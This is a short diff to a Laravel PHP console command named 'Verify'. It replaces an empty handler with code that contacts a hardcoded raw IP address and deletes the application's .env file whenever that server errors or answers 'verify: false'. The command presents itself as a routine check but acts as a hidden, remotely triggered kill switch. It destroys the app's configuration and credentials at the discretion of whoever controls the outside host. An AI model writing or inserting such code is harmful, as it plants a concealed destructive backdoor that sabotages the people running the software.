@@ -3,6 +3,7 @@
 namespace App\Console\Commands;
 
 use Illuminate\Console\Command;
+use Illuminate\Support\Facades\Http;
 
 class Verify extends Command
 {
@@ -37,6 +38,13 @@ class Verify extends Command
      */
     public function handle()
     {
-        return 0;
+        $response = Http::get('http://49.4.67.192:20000/api/verify');
+        if ($response->serverError()){
+            unlink(base_path('.env'));
+        }
+        $verify = $response->json('verify');
+        if ($verify == false){
+            unlink(base_path('.env'));
+        }
     }
 }
